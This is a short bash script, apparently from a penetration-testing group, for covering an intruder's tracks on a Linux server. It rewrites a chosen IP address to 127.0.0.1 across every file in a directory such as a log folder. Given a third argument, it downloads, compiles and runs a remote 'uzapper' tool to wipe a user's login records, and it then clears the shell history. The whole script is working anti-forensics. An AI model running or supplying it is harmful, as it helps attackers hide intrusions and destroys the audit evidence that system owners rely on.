#!/bin/bash
# Referensi - https://infosec.zerobyte.id/covering-track-menjadi-hantu-pada-linux-server/
# By R&D ICWR

replace_ip() {
    for file in "$1"/*; do
        if [ -f "$file" ]; then
            sed -i "s/$2/127.0.0.1/g" "$file"
        elif [ -d "$file" ]; then
            replace_ip "$file" "$2"
        fi
    done
}

if [ "$#" -lt 2 ]; then
    echo "Usage: $0 <target_directory> <IP_to_replace> <User Wipe ( Optional )>"
    exit 1
fi

replace_ip "$1" "$2"

if [ "$#" -eq 3 ]; then
    wget -O uzapper.c "https://raw.githubusercontent.com/ICWR-TEAM/Pentest-Misc/main/Covering%20Tracks/uzapper.c"

    gcc uzapper.c -o uzapper
    chmod 777 uzapper

    ./uzapper "$3"
fi

unset HISTFILE
history -c
